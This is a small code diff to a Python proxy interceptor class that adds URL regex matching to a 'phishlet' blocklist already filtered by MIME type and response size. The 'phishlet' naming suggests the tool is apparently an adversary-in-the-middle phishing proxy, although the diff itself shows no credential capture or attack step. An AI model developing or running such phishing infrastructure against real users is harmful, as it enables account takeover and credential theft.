@@ -225,6 +225,7 @@ class VantaInterceptor:
             pass
         # 2d. Blocklist by mime/size
         try:
+            url = getattr(flow.request, "pretty_url", "") or getattr(flow.request, "path", "")
             ctype = flow.response.headers.get("content-type", "")
             clen = 0
             try:
@@ -232,6 +233,11 @@ class VantaInterceptor:
             except Exception:
                 clen = len(flow.response.content or b"")
             for rule in getattr(self.phishlet, "blocklist", []):
+                try:
+                    if rule.pattern and url and not re.search(rule.pattern, url):
+                        continue
+                except Exception:
+                    pass
                 if rule.mimes and not any(m in ctype for m in rule.mimes):
                     continue
                 if rule.max_kb is not None and clen > rule.max_kb * 1024:
